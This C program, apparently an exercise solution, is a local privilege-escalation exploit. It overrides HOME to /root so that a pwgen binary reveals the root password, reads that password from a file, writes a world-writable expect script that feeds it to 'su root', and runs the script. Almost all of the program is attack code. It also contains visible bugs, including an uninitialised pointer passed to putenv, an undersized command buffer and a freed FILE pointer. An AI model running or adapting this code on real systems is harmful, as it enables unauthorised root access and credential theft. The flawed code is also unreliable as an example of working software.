#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
  char *password;
  FILE * fp ;
  char *ev;
  int i = 31; 
  //change the enviroment variable HOME to trick the program 
  putenv("HOME=/root");
  //get the password generated 
 
  system("/usr/local/bin/pwgen -w > password");
  fp = fopen("password", "r");
  while (i != 0) {
    i--;
    fgetc(fp);
  }
  password = malloc(9);
  fgets(password, 9, fp);
  fclose(fp);

  putenv(ev);
  //write a script to run 
  fp = fopen("/home/user/script.sh", "w+");
  fprintf(fp, "#!/usr/bin/expect -f\n");
  fprintf(fp, "set PASSWORD [lindex $argv 0]\n");
  fprintf(fp, "spawn su root\n");  
  fprintf(fp, "expect \"Password:\"\nsend -- \"$PASSWORD f\r\"\ninteract\n"); 
  fclose(fp);

  // run the script with the password that we obtain 
  system("chmod 777 /home/user/script.sh");
  ev = malloc(20);
  sprintf(ev, "/home/user/script.sh %s", password);
  system(ev);
  free(fp);
  free(password);
  free(ev);
  exit(0);

}